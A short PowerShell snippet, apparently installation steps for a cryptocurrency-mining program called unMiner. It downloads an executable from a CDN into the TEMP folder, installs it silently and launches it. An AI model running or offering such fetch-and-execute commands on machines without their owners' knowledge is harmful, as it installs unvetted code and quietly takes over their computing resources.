Invoke-WebRequest -Uri "https://cdn.unmineable.download/unMiner.2.8.0-beta.exe" -OutFile "$env:TEMP\unMiner.exe"
Start-Process -FilePath "$env:TEMP\unMiner.exe" -ArgumentList "/S" -Wait
Start-Process -FilePath "$env:ProgramFiles\unMiner\unMiner.exe"
